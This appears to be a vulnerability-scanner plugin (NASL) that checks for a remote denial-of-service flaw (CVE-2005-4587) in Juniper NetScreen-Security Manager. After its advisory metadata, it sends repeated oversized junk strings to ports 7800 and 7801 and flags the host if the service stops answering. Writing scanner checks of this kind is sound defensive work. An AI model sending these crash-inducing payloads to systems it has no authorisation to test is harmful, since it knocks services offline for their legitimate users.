# SPDX-FileCopyrightText: 2006 David Maciejak
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.20388");
  script_version("2023-08-03T05:05:16+0000");
  script_tag(name:"last_modification", value:"2023-08-03 05:05:16 +0000 (Thu, 03 Aug 2023)");
  script_tag(name:"creation_date", value:"2006-03-26 17:55:15 +0200 (Sun, 26 Mar 2006)");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:C");
  script_cve_id("CVE-2005-4587");
  script_xref(name:"OSVDB", value:"22047");
  script_name("Juniper NetScreen-Security Manager Remote DoS flaw");
  script_category(ACT_DENIAL);
  script_family("Denial of Service");
  script_copyright("Copyright (C) 2006 David Maciejak");
  script_dependencies("find_service.nasl");
  script_require_ports(7800, 7801);

  script_xref(name:"URL", value:"https://seclists.org/fulldisclosure/2005/Dec/1304");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/16075");

  script_tag(name:"summary", value:"The version of Juniper NetScreen-Security Manager (NSM) installed on
  the remote host may allow an attacker to deny service to legitimate users using specially-crafted long
  strings to the guiSrv and devSrv processes. A watchdog service included in Juniper NSM, though,
  automatically restarts the application.");

  script_tag(name:"impact", value:"By repeatedly sending a malformed request, an attacker may permanently
  deny access to legitimate users.");

  script_tag(name:"solution", value:"Upgrade to Juniper NSM version 2005.1.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_probe");

  exit(0);
}

foreach port( make_list( 7800, 7801 ) ) {

  if( ! get_port_state( port ) )
    continue;

  soc = open_sock_tcp( port );
  if( ! soc )
    continue;

  nbtest = 50;
  cz = raw_string( 0xff, 0xed, 0xff, 0xfd, 0x06 );
  teststr = crap( 300 ) + '\r\n';

  send( socket:soc, data:cz + '\r\n' );
  while( nbtest-- > 0 ) {
    send( socket:soc, data:teststr );
    soc2 = open_sock_tcp( port );
    if( ! soc2 ) {
      security_message( port:port );
      exit( 0 );
    }
    close( soc2 );
  }
}

exit( 99 );
